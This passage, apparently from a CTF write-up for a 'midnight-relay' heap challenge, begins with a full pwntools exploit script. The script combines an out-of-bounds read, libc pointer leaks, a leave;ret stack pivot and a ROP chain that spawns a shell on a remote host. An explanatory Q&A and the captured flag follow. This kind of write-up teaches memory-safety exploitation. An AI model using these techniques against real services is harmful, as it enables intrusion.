        self.send(r, 0x22, bytes([idx & 0xf]) + struct.pack('<HH', off, len(data)) + bytes(data))

    def fire(self, r, payload):
        self.send(r, 0x66, bytes(payload))


def exploit():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("20.193.149.152", 1338)

    r.recvuntil(b"midnight-relay\n")
    s   = State()
    sl  = lambda: time.sleep(0.05)
    SZ  = 0x520    # SLOT0_SIZE

    # ── Phase 5: Leaks ────────────────────────────────────────────────────────

    # 1. Forge slot 0 — the main exploit slot
    s.forge(r, 0, SZ);  sl()

    # 2. Read footer → buf_ptr, pie_base, cookie
    s.observe(r, 0, SZ, 0x20)
    meta = r.recvn(0x20);  sl()
    f0, f1, f2, f3 = struct.unpack('<4Q', meta)

    buf_ptr     = f2
    footer_addr = buf_ptr + SZ
    idle_ptr    = (footer_addr >> 13) ^ f0 ^ f1 ^ f3
    pie_base    = idle_ptr - 0x17b0
    cookie      = f0 ^ (footer_addr >> 12) ^ 0x48454c494f5300ff

    log.success(f"buf_ptr   = {hex(buf_ptr)}")
    log.success(f"pie_base  = {hex(pie_base)}")

    # 3. Forge slot 1 (large → unsorted bin) + slot 2 (guard)
    s.forge(r, 1, 0x500);  sl()
    s.forge(r, 2, 0x80);   sl()

    # 4. Shred slot 1 → chunk freed into unsorted bin (too large for tcache)
    s.shred(r, 1);  sl()

    # 5. OOB read via u16 overflow: (ushort)(0x540 + 0xFAC0) = 0 <= 0x540
    s.observe(r, 0, 0x540, 0xFAC0)
    dump = r.recvn(0xFAC0);  sl()

    # Scan for libc pointer (lo12 = 0xb20 = UNSORTED_OFF & 0xFFF)
    fd_leak = None
    for i in range(0, min(0x2000, len(dump) - 7), 8):
        val = u64(dump[i:i+8])
        if val > 0x10000 and val < (1 << 48) and (val & 0xFFF) == (UNSORTED_OFF & 0xFFF):
            fd_leak = val
            break
    if fd_leak is None:
        raise Exception("libc pointer not found in OOB dump")

    libc_base = fd_leak - UNSORTED_OFF
    if libc_base & 0xFFF:
        raise Exception(f"libc_base misaligned: {hex(libc_base)}")

    log.success(f"libc_base = {hex(libc_base)}")

    # ── Phase 6: Exploit ──────────────────────────────────────────────────────

    # 6. Overwrite footer[1] to encode leave;ret as the decoded fn_ptr
    leave_ret   = libc_base + LEAVE_RET
    new_f1      = (footer_addr >> 13) ^ f0 ^ f3 ^ leave_ret
    s.tune(r, 0, SZ + 8, struct.pack('<Q', new_f1));  sl()

    # 7. Arm slot 0 (sync)
    token = (s.epoch ^ (f0 & 0xFFFFFFFF) ^ (f3 & 0xFFFFFFFF)) & 0xFFFFFFFF
    s.sync(r, 0, token);  sl()

    # 8. Build ROP chain — execve("/bin/sh", NULL, NULL)
    POP_RDI_addr     = libc_base + POP_RDI
    POP_RSI_addr     = libc_base + POP_RSI
    XOR_EDX_RET_addr = libc_base + XOR_EDX_RET
    POP_RAX_addr     = libc_base + POP_RAX
    SYSCALL_addr     = libc_base + SYSCALL
    BINSH_addr       = libc_base + BINSH

    rop  = p64(POP_RDI_addr)     + p64(BINSH_addr)
    rop += p64(POP_RSI_addr)     + p64(0)
    rop += p64(XOR_EDX_RET_addr)
    rop += p64(POP_RAX_addr)     + p64(59)
    rop += p64(SYSCALL_addr)

    # 9. Fire — p64(0): byte 0 = slot idx 0, bytes 1-7 = fake rbp
    s.fire(r, p64(0) + rop);  sl()

    log.success("Shell spawned!")

    # 10. Get flag
    r.sendline(b"cat /app/flag*")
    try:
        flag = r.recvline(timeout=5)
        log.success(f"Flag: {flag.decode().strip()}")
    except:
        pass
    r.interactive()


def main():
    for attempt in range(5):
        try:
            return exploit()
        except Exception as e:
            log.warning(f"Attempt {attempt+1} failed: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
```

---

## 9. Key Confusion Points and Lessons

### "Why does shred not zero the pointer? Is that intentional?"

It's almost certainly a bug rather than intentional design. In a correct implementation, `shred` should do:

```c
free(slots[idx].ptr);
slots[idx].ptr    = NULL;   // ← missing
slots[idx].active = 0;
slots[idx].size   = 0;      // ← also missing
```

The absence of `ptr = NULL` is the UAF. In real codebases, this is one of the most common memory safety bugs. The fix is always: **zero every reference to freed memory immediately**.

### "Why use a large slot for libc leak? Why not just read fd directly with observe(1, 0, 8)?"

Both approaches work in theory. However, `observe(1, 0, 8)` after `shred(1)` relies on the slot1 chunk staying in unsorted bin untouched. The problem: `calloc` (used for the observe command's own packet buffer) uses glibc's `malloc` internally, which checks tcache first. If there's a recycled 0x20-byte chunk in tcache, `calloc` takes it from tcache and the freed slot1 chunk stays untouched with fd at `slot1_ptr + 0`.

But if tcache doesn't have a free 0x20 chunk, `calloc` may go to unsorted bin, split the chunk, and the fd pointer moves to `slot1_ptr + 0x20` — a different offset. This makes the UAF-at-offset-0 approach fragile.

The **OOB dump approach** avoids all of this. It reads 64KB regardless of heap state and scans for any libc pointer. It always works.

### "What is the unsorted bin and why does it contain libc addresses?"

When glibc frees a chunk that is too large for tcache (chunk size > `0x408`), it puts it in the **unsorted bin** — a doubly-linked circular list maintained inside `main_arena` (a global struct in libc). The list head pointer lives at `main_arena + 0x60`. When you free a single chunk into an empty unsorted bin:

```
chunk->fd = &main_arena.bins[0]  = libc + 0x203b20
chunk->bk = &main_arena.bins[0]  = libc + 0x203b20
```

These pointers are written into the first 16 bytes of the freed chunk's user data. If you can read those bytes, you have a libc address. Subtract the known offset `0x203b20` to get `libc_base`.

### "Why scan for lo12 = 0xb20 instead of an exact match?"

ASLR randomizes the upper bits of libc's load address (bits 12 and above, since the base is always page-aligned = 12 bits of zeros at the bottom). The lower 12 bits of any libc pointer are fixed and predictable — they depend only on the libc version, not on ASLR. `main_arena + 0x60` in this libc always ends in `0xb20`. This fingerprint lets you find the pointer in a heap dump without knowing libc's address in advance.

### "Why does the u16 overflow work when off and n are both u16?"

In C, arithmetic on `unsigned short` (u16) operands promotes to `int` (32-bit) before the operation. But the code explicitly casts the result back: `(ushort)(off + n)`. This cast truncates to 16 bits, discarding the carry. The comparison then uses the truncated value. The `write()` syscall however uses the original 16-bit variables directly (via zero-extension to 64-bit), which are their full values — no truncation. This mismatch between the bounds check and the actual operation is the bug.

### "Why leave;ret for the stack pivot? Why not a one-gadget?"

A one-gadget (a single `execve` gadget inside libc) requires specific register state. At the point of `CALL RAX`, the registers hold whatever the main loop left them with — not the state the one-gadget needs. `leave ; ret` is reliable precisely because it doesn't care about register state: it only uses `RBP` (which the loop conveniently set to `__ptr`) and redirects `RSP` into your controlled buffer. From there you control the entire stack, so you set registers yourself via pop gadgets.

### "Why does execve replace the process instead of crashing the jail?"

`pwn.red/jail` blocks `fork`, `clone`, and `execveat` (in its default mode). But `JAIL_SYSCALLS=execve,execveat` is an explicit **allowlist** — it permits those two calls. The key insight: `execve` *replaces* the current process image rather than creating a new child. The jail is still running as the parent process, but the `midnight_relay` program's code is replaced by `/bin/sh`. Since `/bin/sh` was `execve`'d (not forked), it inherits the same stdin/stdout/stderr — and you have a shell.

### "Why does the cookie appear reversed (SOILEH not HELIOS) in strings output?"

`strings` searches for printable ASCII characters in sequence. The constant `0x48454c494f5300ff` stored in little-endian 64-bit format is:

```
bytes in memory: ff 00 53 4f 49 4c 45 48
                              S  O  I  L  E  H
```

`strings` reads left-to-right and finds `SOILEH` — the readable portion — in reverse because x86 is little-endian and the high bytes of the integer (containing the ASCII letters) appear at higher addresses. The `\xff\x00` at the start breaks it before the letters. This is a common trick to embed recognizable constants in binaries while making them slightly harder to spot.

---

## Final Attack Diagram

```
  BEFORE EXPLOIT:
  ┌─────────────────────────────────┐
  │  slot0 buffer (0x520 bytes)     │  buf_ptr
  ├─────────────────────────────────┤  footer_addr = buf_ptr + 0x520
  │  f0: integrity                  │  → decode → cookie
  │  f1: enc(idle_ptr)              │  → decode → pie_base   [OVERWRITE → enc(leave;ret)]
  │  f2: buf_ptr                    │  → direct heap address
  │  f3: random token               │  → used in sync token
  └─────────────────────────────────┘

  slot1 buffer (0x500 bytes, freed)
  ┌─────────────────────────────────┐
  │  fd: main_arena+0x60 ═══════════╪══► libc_base
  │  bk: main_arena+0x60            │
  └─────────────────────────────────┘
       ↑ found by OOB read from slot0

  AFTER EXPLOIT (fire triggers):
  ┌─────────────────────────────────┐
  │  fire packet buffer (__ptr)     │  ← RBP points here
  │  [0x00] 0x00 (slot idx)         │
  │  [0x08] pop rdi ; ret     ◄─────┼── RSP after leave;ret
  │  [0x10] /bin/sh address         │
  │  [0x18] pop rsi ; ret           │
  │  [0x20] 0                       │
  │  [0x28] xor edx,edx ; ret       │
  │  [0x30] pop rax ; ret           │
  │  [0x38] 59 (SYS_execve)         │
  │  [0x40] syscall                 │
  └─────────────────────────────────┘
         │
         ▼
  execve("/bin/sh", NULL, NULL)
         │
         ▼
  $ cat /app/flag*
  BITSCTF{m1dn1ght_r3l4y_m00nb3ll_st4t3_p1v0t}
```
